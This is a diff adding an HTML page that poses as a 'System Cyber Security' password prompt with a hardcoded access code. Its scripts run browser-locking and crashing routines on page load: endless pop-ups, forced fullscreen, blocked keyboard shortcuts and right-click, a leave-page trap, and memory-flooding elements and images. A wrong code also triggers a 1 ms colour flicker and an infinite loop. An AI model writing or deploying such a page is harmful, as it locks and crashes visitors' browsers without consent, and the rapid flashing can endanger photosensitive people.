@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Keamanan Cyber Security</title>
+    <style>
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            background-color: #000;
+            color: #0f0;
+            text-align: center;
+            padding: 50px;
+            overflow: hidden;
+            height: 100vh;
+            margin: 0;
+        }
+
+        input {
+            background-color: #000;
+            color: #0f0;
+            border: 2px solid #0f0;
+            border-radius: 5px;
+            padding: 10px;
+            font-size: 16px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        button {
+            background-color: #0f0;
+            color: #000;
+            border: none;
+            border-radius: 5px;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #000;
+            color: #0f0;
+            border: 2px solid #0f0;
+        }
+
+        .message {
+            margin-top: 20px;
+            font-size: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div id="formContainer">
+        <h1>System Cyber Security</h1>
+        <p>Enter the secret code to continue:</p>
+        
+        <input type="password" id="kodeInput" placeholder="********">
+        <button onclick="verifikasiKode()">ACCESS</button>
+
+        <div class="message" id="message"></div>
+    </div>
+
+    <script>
+        const kodeBenar = "aldy ganteng";
+
+        function verifikasiKode() {
+            const kodeInput = document.getElementById("kodeInput").value;
+            const messageDiv = document.getElementById("message");
+
+            if (kodeInput === kodeBenar) {
+                messageDiv.innerHTML = "ACCESS GRANTED";
+                messageDiv.style.color = "#0f0";
+            } else {
+                messageDiv.innerHTML = "ACCESS DENIED. SYSTEM ERROR!";
+                messageDiv.style.color = "#f00";
+                crashSystem();
+            }
+        }
+
+        function crashSystem() {
+            // Disable interactions
+            document.body.style.pointerEvents = 'none';
+
+            // Overwhelm DOM
+            for (let i = 0; i < 50000; i++) {
+                const randomDiv = document.createElement('div');
+                randomDiv.style.position = 'absolute';
+                randomDiv.style.left = Math.random() * window.innerWidth + 'px';
+                randomDiv.style.top = Math.random() * window.innerHeight + 'px';
+                randomDiv.style.fontSize = Math.random() * 50 + 10 + 'px';
+                randomDiv.style.color = '#' + Math.floor(Math.random() * 16777215).toString(16);
+                randomDiv.innerHTML = "CRASHING!";
+                document.body.appendChild(randomDiv);
+            }
+
+            // Aggressive flickering
+            setInterval(() => {
+                document.body.style.backgroundColor =
+                    '#' + Math.floor(Math.random() * 16777215).toString(16);
+            }, 1);
+
+            // Prevent closing
+            window.onbeforeunload = function() {
+                return "YOU CANNOT LEAVE THIS PAGE!";
+            };
+
+            // Lock in fullscreen
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen().catch(console.error);
+            }
+
+            // Infinite loop to crash browser
+            while (true) {
+                const div = document.createElement("div");
+                div.style.height = "10000px";
+                document.body.appendChild(div);
+            }
+        }
+
+        // Additional measures
+        setInterval(() => {
+            // Keep reactivating fullscreen
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen().catch(console.error);
+            }
+
+            // Disable keyboard shortcuts
+            document.addEventListener('keydown', (event) => {
+                if (event.ctrlKey || event.key === 'F12' || event.key === 'F5' || event.key === 'Escape') {
+                    event.preventDefault();
+                }
+            });
+        }, 100);
+
+        // Continuously spawn pop-ups
+        setInterval(() => {
+            const newWindow = window.open("", "_blank", "width=200,height=200");
+            if (newWindow) {
+                newWindow.document.write("<h1>SYSTEM FAILURE!</h1>");
+                newWindow.blur();
+                window.focus();
+            }
+        }, 2000);
+
+        // Disable right-click
+        document.addEventListener('contextmenu', (event) => event.preventDefault());
+
+        // Lock CPU with massive content generation
+        setInterval(() => {
+            const div = document.createElement("div");
+            div.style.height = "10000px";
+            div.style.backgroundColor = 'black';
+            document.body.appendChild(div);
+        }, 5);
+
+        // Overload browser memory
+        setInterval(() => {
+            const img = new Image();
+            img.src = "data:image/svg+xml;base64," + "A".repeat(1e6);
+            document.body.appendChild(img);
+        }, 10);
+    </script>
+</body>
+</html>
